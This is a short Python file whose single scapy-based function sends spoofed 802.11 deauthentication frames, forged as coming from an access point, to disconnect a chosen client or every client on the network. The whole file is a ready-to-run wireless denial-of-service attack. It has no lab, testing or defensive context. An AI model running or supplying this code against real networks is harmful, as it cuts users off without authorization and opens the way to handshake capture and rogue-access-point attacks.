from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


def deauth(ap_mac: str, target_mac: str, iface: str, frames: int = 10) -> None:
    """Send 802.11 deauthentication frames.

    Parameters
    ----------
    ap_mac : str
        MAC address of the access point.
    target_mac : str
        Client MAC to deauthenticate or ff:ff:ff:ff:ff:ff for broadcast.
    iface : str
        Interface to transmit on.
    frames : int, optional
        Number of frames to send, by default 10.
    """
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(packet, iface=iface, count=frames, inter=0.1, verbose=False)
